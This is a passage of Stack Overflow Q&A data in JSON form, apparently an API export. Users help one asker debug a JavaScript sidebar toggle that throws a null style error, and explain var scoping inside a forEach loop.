11518587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efbb5d6c5ab48c75bde99ac611082548?s=128&d=identicon&r=PG&f=1", "display_name": "htmlhelp32", "link": "https://stackoverflow.com/users/11518587/htmlhelp32"}, "reply_to_user": {"reputation": 28285, "user_id": 5921, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2854463112421fe6a69cfd104d57701c?s=128&d=identicon&r=PG", "display_name": "machineghost", "link": "https://stackoverflow.com/users/5921/machineghost"}, "edited": false, "score": 0, "creation_date": 1558566995, "post_id": 56266038, "comment_id": 99148473, "body": "@machineghost I included where I call openNav, its at the top in the topnav"}, {"owner": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558566999, "post_id": 56266038, "comment_id": 99148475, "body": "please fix the typo in your code you posted here."}, {"owner": {"reputation": 71, "user_id": 11518587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efbb5d6c5ab48c75bde99ac611082548?s=128&d=identicon&r=PG&f=1", "display_name": "htmlhelp32", "link": "https://stackoverflow.com/users/11518587/htmlhelp32"}, "reply_to_user": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558567066, "post_id": 56266038, "comment_id": 99148491, "body": "@RandyCasburn are you talking about the x==true? just fixed it !"}, {"owner": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558567233, "post_id": 56266038, "comment_id": 99148522, "body": "Great - last thing. You need to set <code>x</code> back to true in the <code>else</code>. that is precisely why descriptive variable names are important. You should change <code>x</code> to <code>open</code> or something similar that makes sense to you."}, {"owner": {"reputation": 71, "user_id": 11518587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efbb5d6c5ab48c75bde99ac611082548?s=128&d=identicon&r=PG&f=1", "display_name": "htmlhelp32", "link": "https://stackoverflow.com/users/11518587/htmlhelp32"}, "reply_to_user": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558567395, "post_id": 56266038, "comment_id": 99148564, "body": "@RandyCasburn thank you ! after looking at it again i saw what was wrong and fixed it !"}], "answers": [{"comments": [{"owner": {"reputation": 28285, "user_id": 5921, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2854463112421fe6a69cfd104d57701c?s=128&d=identicon&r=PG", "display_name": "machineghost", "link": "https://stackoverflow.com/users/5921/machineghost"}, "edited": false, "score": 0, "creation_date": 1558567802, "post_id": 56266217, "comment_id": 99148629, "body": "I don&#39;t understand how this could be a solution; what possible value for <code>x</code>, right or wrong, could possibly cause an error of &quot;Uncaught TypeError: Cannot read property &#39;style&#39; of null&quot;?  The only thing that could seem to cause that error is if <code>document.getElementById(&quot;mySidebar&quot;)</code> was <code>null</code>, and no value of <code>x</code> can make that happen."}, {"owner": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "reply_to_user": {"reputation": 28285, "user_id": 5921, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2854463112421fe6a69cfd104d57701c?s=128&d=identicon&r=PG", "display_name": "machineghost", "link": "https://stackoverflow.com/users/5921/machineghost"}, "edited": false, "score": 1, "creation_date": 1558567877, "post_id": 56266217, "comment_id": 99148641, "body": "@machineghost Your statement is correct. All I did in my answer is fix the code OP showed. Added clarification on that."}, {"owner": {"reputation": 28285, "user_id": 5921, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2854463112421fe6a69cfd104d57701c?s=128&d=identicon&r=PG", "display_name": "machineghost", "link": "https://stackoverflow.com/users/5921/machineghost"}, "edited": false, "score": 0, "creation_date": 1558568019, "post_id": 56266217, "comment_id": 99148674, "body": "Well, your fix (for what was clearly bad logic) evidently led the OP to find the real source of his problem ... or else he just gave up and accepted your answer out of embarrassment :)  Either way it&#39;s great they found a solution, but it&#39;s too bad they didn&#39;t come back here with it: without OP reporting what the actual problem and solution was, no one else will get to benefit from this answer."}], "tags": [], "owner": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "is_accepted": true, "score": -1, "last_activity_date": 1558568008, "last_edit_date": 1558568008, "creation_date": 1558567562, "answer_id": 56266217, "question_id": 56266038, "link": "https://stackoverflow.com/questions/56266038/error-uncaught-typeerror-cannot-read-property-style-of-null/56266217#56266217", "title": "error: Uncaught TypeError: Cannot read property &#39;style&#39; of null", "body": "<p>The code you're showing doesn't have that error you've mentioned. What it does mean is that <code>document.getElementById('mySidebar')</code> does not find any element with that <code>id</code> value in your HTML.</p>\n\n<p>Aside from that, why your code example doesn't toggle:</p>\n\n<p>You need to <strong>invert</strong> <code>x</code> <strong>every</strong> time the button is clicked. Currently you're setting it to <code>false</code> in the <code>if</code>-case, but never re-setting it to <code>true</code> in the <code>else</code>-case.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var x = true;\r\n\r\nfunction openNav() {\r\n  if (x == true) {\r\n    document.getElementById(\"mySidebar\").style.width = \"250px\";\r\n  } else {\r\n    document.getElementById(\"mySidebar\").style.width = \"0\";\r\n  }\r\n  x = !x;\r\n}</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.sidenav {\r\n  height: 100%;\r\n  /* Full-height: remove this if you want \"auto\" height */\r\n  width: 250px;\r\n  /* Set the width of the sidebar */\r\n  position: fixed;\r\n  /* Fixed Sidebar (stay in place on scroll) */\r\n  z-index: 1;\r\n  /* Stay on top */\r\n  top: ;\r\n  /* 0 to Stay at the top */\r\n  left: 0;\r\n  background-color: #1b1b1b;\r\n  /* Black */\r\n  overflow-x: hidden;\r\n  /* Disable horizontal scroll */\r\n  padding-top: 20px;\r\n  transition: 0.5s;\r\n  /* 0.5 second transition effect to slide in the sidebar */\r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;button class=\"openbtn\" onclick=\"openNav()\"&gt;&amp;#9776; Toggle Sidebar&lt;/button&gt;\r\n&lt;div id=\"mySidebar\" class=\"sidenav\"&gt;\r\n  &lt;a href=\"#\"&gt;Auto &amp;amp; Vehicale&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Beuty &amp;amp; Fashion&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Comedy&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Education&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Entertainment&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Film &amp;amp; Animation&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Food&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Gaming&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;How-To&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Music&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;News &amp;amp; Politics&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Nonprofits &amp;amp; Activism&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;People &amp;amp; Blogs&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;People &amp;amp; Animals&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Technology&lt;/a&gt;\r\n&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 28285, "user_id": 5921, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2854463112421fe6a69cfd104d57701c?s=128&d=identicon&r=PG", "display_name": "machineghost", "link": "https://stackoverflow.com/users/5921/machineghost"}, "is_accepted": false, "score": 1, "last_activity_date": 1558567569, "creation_date": 1558567569, "answer_id": 56266218, "question_id": 56266038, "link": "https://stackoverflow.com/questions/56266038/error-uncaught-typeerror-cannot-read-property-style-of-null/56266218#56266218", "title": "error: Uncaught TypeError: Cannot read property &#39;style&#39; of null", "body": "<p>Fundamentally what's going on is the browser is failing to find the element with the ID \"mySidebar\" (thus the error \"Cannot read property 'style' of null\" ... when you try to access the <code>style</code> property of that element).  However, that element is clearly there in your HTML, and there's no issues with event hook-up timings because you're using an <code>onclick</code> attribute.</p>\n\n<p>In other words, something doesn't add up.  All that's relevant here is:</p>\n\n<pre><code>&lt;button onclick=\"openNav()\"&gt;&amp;#9776; Toggle Sidebar&lt;/button&gt;\n&lt;div id=\"mySidebar\" &gt;&lt;/div&gt;\n</code></pre>\n\n<p>and:</p>\n\n<pre><code>function openNav() {\n  console.log(document.getElementById(\"mySidebar\"));\n}\n</code></pre>\n\n<p>If you just had that, you should see mySidebar get logged when you click your button, and if that happens then you shouldn't be getting errors about \"Cannot read property 'style' of null\" (referring to <code>document.getElementById(\"mySidebar\")</code> being null).</p>\n\n<p>If you do, there must be a typo or something we're not seeing.</p>\n"}, {"comments": [{"owner": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "edited": false, "score": 1, "creation_date": 1558568122, "post_id": 56266270, "comment_id": 99148683, "body": "Use <code>classList.toggle(&#39;close&#39;)</code> to save the hassle of checking."}, {"owner": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "edited": false, "score": 0, "creation_date": 1558568257, "post_id": 56266270, "comment_id": 99148696, "body": "<code>function openNav() { mySidebar.classList.toggle(&#39;close&#39;) }</code> is a little shorter."}], "tags": [], "owner": {"reputation": 2159, "user_id": 9622918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jiboX.png?s=128&g=1", "display_name": "Aditya Thakur", "link": "https://stackoverflow.com/users/9622918/aditya-thakur"}, "is_accepted": false, "score": 0, "last_activity_date": 1558567995, "creation_date": 1558567995, "answer_id": 56266270, "question_id": 56266038, "link": "https://stackoverflow.com/questions/56266038/error-uncaught-typeerror-cannot-read-property-style-of-null/56266270#56266270", "title": "error: Uncaught TypeError: Cannot read property &#39;style&#39; of null", "body": "<p>Create a class <code>close</code> with <code>width: 0px</code>, You can use the classList property of the object to check if the object is closed or open by checking if it contains the class <code>close</code> or not. </p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>function openNav(){\r\n  let a = document.querySelector('#mySidebar')\r\n  if(a.classList.contains('close')){\r\n    a.classList.remove('close')\r\n  }else{\r\n    a.classList.add('close')\r\n  }\r\n}</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.sidenav {\r\n  height: 100%;\r\n  /* Full-height: remove this if you want \"auto\" height */\r\n  width: 250px;\r\n  /* Set the width of the sidebar */\r\n  position: fixed;\r\n  /* Fixed Sidebar (stay in place on scroll) */\r\n  z-index: 1;\r\n  /* Stay on top */\r\n  top: ;\r\n  /* 0 to Stay at the top */\r\n  left: 0;\r\n  background-color: #1b1b1b;\r\n  /* Black */\r\n  overflow-x: hidden;\r\n  /* Disable horizontal scroll */\r\n  padding-top: 20px;\r\n  transition: 0.5s;\r\n  /* 0.5 second transition effect to slide in the sidebar */\r\n}\r\n.close{\r\n width: 0px;\r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;button class=\"openbtn\" onclick=\"openNav()\"&gt;&amp;#9776; Toggle Sidebar&lt;/button&gt;\r\n&lt;div id=\"mySidebar\" class=\"sidenav\"&gt;\r\n  &lt;a href=\"#\"&gt;Auto &amp;amp; Vehicale&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Beuty &amp;amp; Fashion&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Comedy&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Education&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Entertainment&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Film &amp;amp; Animation&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Food&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Gaming&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;How-To&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Music&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;News &amp;amp; Politics&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Nonprofits &amp;amp; Activism&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;People &amp;amp; Blogs&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;People &amp;amp; Animals&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Technology&lt;/a&gt;\r\n&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 71, "user_id": 11518587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efbb5d6c5ab48c75bde99ac611082548?s=128&d=identicon&r=PG&f=1", "display_name": "htmlhelp32", "link": "https://stackoverflow.com/users/11518587/htmlhelp32"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1513, "favorite_count": 0, "accepted_answer_id": 56266217, "answer_count": 3, "score": -1, "last_activity_date": 1558568008, "creation_date": 1558566070, "last_edit_date": 1558567343, "question_id": 56266038, "link": "https://stackoverflow.com/questions/56266038/error-uncaught-typeerror-cannot-read-property-style-of-null", "title": "error: Uncaught TypeError: Cannot read property &#39;style&#39; of null", "body": "<p>Im getting this error</p>\n\n<p>error: Uncaught TypeError: Cannot read property 'style' of null</p>\n\n<p>I cant figure out whats wrong. I am pretty sure I have everything set up correctly</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var x = true;\r\n\r\nfunction openNav() {\r\n  if (x == true) {\r\n    document.getElementById(\"mySidebar\").style.width = \"250px\";\r\n    x = false;\r\n  } else {\r\n    document.getElementById(\"mySidebar\").style.width = \"0\";\r\n\r\n  }\r\n\r\n}</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.sidenav {\r\n  height: 100%;\r\n  /* Full-height: remove this if you want \"auto\" height */\r\n  width: 250px;\r\n  /* Set the width of the sidebar */\r\n  position: fixed;\r\n  /* Fixed Sidebar (stay in place on scroll) */\r\n  z-index: 1;\r\n  /* Stay on top */\r\n  top: ;\r\n  /* 0 to Stay at the top */\r\n  left: 0;\r\n  background-color: #1b1b1b;\r\n  /* Black */\r\n  overflow-x: hidden;\r\n  /* Disable horizontal scroll */\r\n  padding-top: 20px;\r\n  transition: 0.5s;\r\n  /* 0.5 second transition effect to slide in the sidebar */\r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;button class=\"openbtn\" onclick=\"openNav()\"&gt;&amp;#9776; Toggle Sidebar&lt;/button&gt;\r\n&lt;div id=\"mySidebar\" class=\"sidenav\"&gt;\r\n  &lt;a href=\"#\"&gt;Auto &amp;amp; Vehicale&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Beuty &amp;amp; Fashion&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Comedy&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Education&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Entertainment&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Film &amp;amp; Animation&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Food&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Gaming&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;How-To&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Music&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;News &amp;amp; Politics&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Nonprofits &amp;amp; Activism&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;People &amp;amp; Blogs&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;People &amp;amp; Animals&lt;/a&gt;\r\n  &lt;a href=\"#\"&gt;Technology&lt;/a&gt;\r\n&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>basically what I am trying to do is use the open button to both open the side navigation and also use the same button to close it if its open.</p>\n"}, {"tags": ["javascript"], "comments": [{"owner": {"reputation": 15695, "user_id": 636077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7567fa8bd8d37173c923c75d259f104?s=128&d=identicon&r=PG", "display_name": "ray hatfield", "link": "https://stackoverflow.com/users/636077/ray-hatfield"}, "edited": false, "score": 2, "creation_date": 1558565792, "post_id": 56265987, "comment_id": 99148226, "body": "when you declare <code>var str</code> inside the loop you&#39;re creating a new variable, not reassigning the one outside the loop."}], "answers": [{"comments": [{"owner": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "edited": false, "score": 0, "creation_date": 1558565958, "post_id": 56266004, "comment_id": 99148254, "body": "got it thank you, just curios why is a redeclared str not available outside the loop?"}, {"owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "reply_to_user": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "edited": false, "score": 0, "creation_date": 1558566018, "post_id": 56266004, "comment_id": 99148265, "body": "@RobertSinclair It is available outside of the loop, but only after the loop is complete. You can&#39;t access a variable prior to it being created."}, {"owner": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "edited": false, "score": 0, "creation_date": 1558566066, "post_id": 56266004, "comment_id": 99148274, "body": "i see, i&#39;m guessing it has something to do with the asynchronous nature of JS?"}, {"owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "reply_to_user": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "edited": false, "score": 1, "creation_date": 1558566323, "post_id": 56266004, "comment_id": 99148323, "body": "@RobertSinclair No, it&#39;s about scope. Variables declared with <code>var</code> are scoped to the function that they are declared inside of. In your case, that would be the anonymous function passed to the <code>.forEach()</code>. Since that function isn&#39;t available outside of the loop, neither is it&#39;s local variables (unless we get into closures), but in general, if you declare a variable with <code>var</code> in a loop, it will be available in that function at any point after the loop ends."}, {"owner": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "edited": false, "score": 0, "creation_date": 1558566373, "post_id": 56266004, "comment_id": 99148332, "body": "Makes perfect sense now, thank you for the clear explanation!"}, {"owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "reply_to_user": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "edited": false, "score": 0, "creation_date": 1558566427, "post_id": 56266004, "comment_id": 99148340, "body": "@RobertSinclair You&#39;re welcome. Don&#39;t forget to mark this as &quot;the&quot; answer."}, {"owner": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "edited": false, "score": 0, "creation_date": 1558566697, "post_id": 56266004, "comment_id": 99148402, "body": "<i>Re-declaring it wipes out the earlier variable</i> No."}, {"owner": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "edited": false, "score": 0, "creation_date": 1558566988, "post_id": 56266004, "comment_id": 99148470, "body": "In the context of the question this is irrelevant and anyone would interpret that as <i>wipes out the outer <code>str</code></i>."}, {"owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "reply_to_user": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "edited": false, "score": 0, "creation_date": 1558567009, "post_id": 56266004, "comment_id": 99148478, "body": "@connexo Updated for clarity."}], "tags": [], "owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "is_accepted": true, "score": 3, "last_activity_date": 1558566972, "last_edit_date": 1558566972, "creation_date": 1558565775, "answer_id": 56266004, "question_id": 56265987, "link": "https://stackoverflow.com/questions/56265987/change-value-of-a-variable-inside-foreach-loop-make-it-available-outside-the-lo/56266004#56266004", "title": "Change value of a variable inside foreach loop? Make it available outside the loop", "body": "<p>This is because you are re-declaring the variable with <code>var</code> in the loop instead of just updating/setting it. Re-declaring it wipes out the earlier variable of the same name from the previous loop iteration and hides the one from the function in the higher scope. It establishes a new one instead of just updating the value in the existing one.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var arr = [\"one\"];\r\nvar str = 0;\r\narr.forEach(function(part){\r\n if(part == 'one') {\r\n   str = 1;\r\n   console.log('str changed to: ' + str);\r\n }\r\n})\r\n\r\nconsole.log('str is now: ' + str);</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"comments": [{"owner": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "edited": false, "score": 0, "creation_date": 1558565926, "post_id": 56266010, "comment_id": 99148247, "body": "got it thank you, just curios why is a redeclared str not available outside the loop?"}, {"owner": {"reputation": 28753, "user_id": 371184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cebee1b08fb960edf79a359af330391a?s=128&d=identicon&r=PG", "display_name": "Mike Cluck", "link": "https://stackoverflow.com/users/371184/mike-cluck"}, "reply_to_user": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "edited": false, "score": 0, "creation_date": 1558566218, "post_id": 56266010, "comment_id": 99148300, "body": "@RobertSinclair Because variables are scoped to each function (or global). When you declare a variable inside of a function then that variable is available inside of the function. If there were any variables declared outside of that function with the same name then they are &quot;shadowed&quot;."}, {"owner": {"reputation": 28753, "user_id": 371184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cebee1b08fb960edf79a359af330391a?s=128&d=identicon&r=PG", "display_name": "Mike Cluck", "link": "https://stackoverflow.com/users/371184/mike-cluck"}, "reply_to_user": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "edited": false, "score": 0, "creation_date": 1558566263, "post_id": 56266010, "comment_id": 99148312, "body": "@RobertSinclair I&#39;d recommend <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/var\" rel=\"nofollow noreferrer\">doing some reading on MDN</a> for a better explanation."}, {"owner": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "edited": false, "score": 0, "creation_date": 1558566303, "post_id": 56266010, "comment_id": 99148320, "body": "aahh.. okey .. great explanation thank you! I should have paid closer attention to the final &#39;})&#39;; Makes perfect sense now"}], "tags": [], "owner": {"reputation": 28753, "user_id": 371184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cebee1b08fb960edf79a359af330391a?s=128&d=identicon&r=PG", "display_name": "Mike Cluck", "link": "https://stackoverflow.com/users/371184/mike-cluck"}, "is_accepted": false, "score": 2, "last_activity_date": 1558565821, "creation_date": 1558565821, "answer_id": 56266010, "question_id": 56265987, "link": "https://stackoverflow.com/questions/56265987/change-value-of-a-variable-inside-foreach-loop-make-it-available-outside-the-lo/56266010#56266010", "title": "Change value of a variable inside foreach loop? Make it available outside the loop", "body": "<p>The problem is that you're declaring a <em>new</em> <code>str</code> variable inside of <code>forEach</code>. Just drop the <code>var</code> and it will work.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var arr = [\"one\"];\r\nvar str = 0;\r\n\r\narr.forEach(function(part) {\r\n  if (part == 'one') {\r\n    str = 1; // Notice the lack of var\r\n    console.log('str changed to: ' + str);\r\n  }\r\n});\r\n\r\nconsole.log('str is now: ' + str);</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"comments": [{"owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "edited": false, "score": 0, "creation_date": 1558566384, "post_id": 56266058, "comment_id": 99148333, "body": "What does this have to do with the actual question being asked?"}, {"owner": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "reply_to_user": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "edited": false, "score": 0, "creation_date": 1558566617, "post_id": 56266058, "comment_id": 99148376, "body": "@Scott Added clarification on that."}], "tags": [], "owner": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "is_accepted": false, "score": 1, "last_activity_date": 1558566568, "last_edit_date": 1558566568, "creation_date": 1558566212, "answer_id": 56266058, "question_id": 56265987, "link": "https://stackoverflow.com/questions/56265987/change-value-of-a-variable-inside-foreach-loop-make-it-available-outside-the-lo/56266058#56266058", "title": "Change value of a variable inside foreach loop? Make it available outside the loop", "body": "<p>Just as an additional answer that wants to suggest a different way to do what you are doing with 